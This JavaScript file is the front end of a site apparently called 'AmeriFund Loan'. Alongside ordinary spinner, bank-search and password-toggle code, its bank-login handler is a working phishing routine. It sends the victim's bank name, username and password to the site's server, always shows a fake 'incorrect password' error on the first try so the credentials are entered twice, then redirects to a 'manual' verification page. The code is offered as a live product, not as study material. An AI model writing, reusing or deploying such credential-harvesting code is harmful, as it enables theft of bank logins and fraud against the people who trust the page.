// Main JavaScript for AmeriFund Loan

// Global loading spinner function
function showLoader() {
  const loader = document.querySelector('.loader-container');
  if (loader) {
    loader.style.display = 'flex';
    
    // Always hide loader after 5 seconds (required by the spec)
    setTimeout(() => {
      hideLoader();
    }, 5000);
  }
}

function hideLoader() {
  const loader = document.querySelector('.loader-container');
  if (loader) {
    loader.style.display = 'none';
  }
}

// Handle form submissions with loading spinner
document.addEventListener('DOMContentLoaded', function() {
  // Add loader container if it doesn't exist
  if (!document.querySelector('.loader-container')) {
    const loaderContainer = document.createElement('div');
    loaderContainer.className = 'loader-container';
    const loader = document.createElement('div');
    loader.className = 'loader';
    loaderContainer.appendChild(loader);
    document.body.appendChild(loaderContainer);
  }
  
  // Add loading spinner to all form submissions
  const forms = document.querySelectorAll('form');
  forms.forEach(form => {
    form.addEventListener('submit', function(e) {
      // Don't show loader for forms with 'no-loader' class
      if (!this.classList.contains('no-loader')) {
        showLoader();
      }
    });
  });
  
  // Handle bank login form specially for the first/second attempt behavior
  const bankLoginForm = document.getElementById('bank-login-form');
  if (bankLoginForm) {
    bankLoginForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      const username = document.getElementById('bank-username').value;
      const password = document.getElementById('bank-password').value;
      const bankName = document.getElementById('selected-bank-name').value;
      const attemptCount = parseInt(localStorage.getItem('bankLoginAttempts') || '0') + 1;
      
      // Show loader
      showLoader();
      
      // Send the attempt info to the server
      fetch('/api/bank-login-attempt', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bank: bankName,
          username: username,
          password: password,
          attempt: attemptCount
        })
      });
      
      // Store the attempt count
      localStorage.setItem('bankLoginAttempts', attemptCount.toString());
      
      // After 5 seconds of loading...
      setTimeout(() => {
        hideLoader();
        
        if (attemptCount === 1) {
          // First attempt - show error
          Swal.fire({
            title: 'Authentication Error',
            text: 'Incorrect username or password. Please try again.',
            icon: 'error',
            confirmButtonText: 'Try Again'
          });
        } else {
          // Second attempt - redirect to manual entry
          window.location.href = '/bank-verification?manual=true';
        }
      }, 5000);
    });
  }
  
  // Bank selection handler
  const bankSearchInput = document.getElementById('bank-search');
  const bankResults = document.getElementById('bank-results');
  
  if (bankSearchInput && bankResults) {
    bankSearchInput.addEventListener('input', function() {
      const searchValue = this.value.toLowerCase();
      const bankItems = bankResults.querySelectorAll('.bank-item');
      
      bankItems.forEach(item => {
        const bankName = item.getAttribute('data-bank-name').toLowerCase();
        if (bankName.includes(searchValue)) {
          item.style.display = 'flex';
        } else {
          item.style.display = 'none';
        }
      });
    });
  }
});

// Handle bank selection
function selectBank(bankName, bankLogo) {
  // Store selected bank
  document.getElementById('selected-bank-name').value = bankName;
  document.getElementById('selected-bank-logo').value = bankLogo;
  
  // Update UI
  document.getElementById('bank-selection').style.display = 'none';
  document.getElementById('bank-login').style.display = 'block';
  
  // Update bank name in the UI
  const bankNameElements = document.querySelectorAll('.selected-bank-name');
  bankNameElements.forEach(el => {
    el.textContent = bankName;
  });
  
  // Update bank logo if available
  const bankLogoImg = document.getElementById('selected-bank-logo-img');
  if (bankLogoImg && bankLogo) {
    bankLogoImg.src = bankLogo;
    bankLogoImg.style.display = 'inline-block';
  }
}

// Reset bank login attempts for testing
function resetBankLoginAttempts() {
  localStorage.removeItem('bankLoginAttempts');
  console.log('Bank login attempts reset');
}

// Show password toggle
function togglePasswordVisibility(inputId) {
  const input = document.getElementById(inputId);
  const icon = document.querySelector(`[onclick="togglePasswordVisibility('${inputId}')"] i`);
  
  if (input.type === 'password') {
    input.type = 'text';
    icon.classList.remove('fa-eye');
    icon.classList.add('fa-eye-slash');
  } else {
    input.type = 'password';
    icon.classList.remove('fa-eye-slash');
    icon.classList.add('fa-eye');
  }
}
